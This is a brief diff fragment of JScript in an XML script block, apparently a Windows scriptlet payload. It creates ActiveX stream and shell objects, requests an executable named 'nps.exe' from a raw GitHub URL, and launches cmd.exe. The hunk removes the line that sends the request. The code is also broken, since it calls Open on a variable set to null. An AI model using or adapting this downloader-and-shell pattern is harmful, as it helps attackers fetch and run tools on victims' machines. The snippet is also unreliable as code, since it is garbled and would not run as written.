@@ -16,7 +16,6 @@
   var sGet=new ActiveXObject("ADODB.Stream"); 
   var xGet=null; 
   xGet.Open("GET","https://raw.githubusercontent.com/kxcode/download/master/nps.exe",0); 
-  xGet.Send(); 
   var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
 ]]>
 </script>
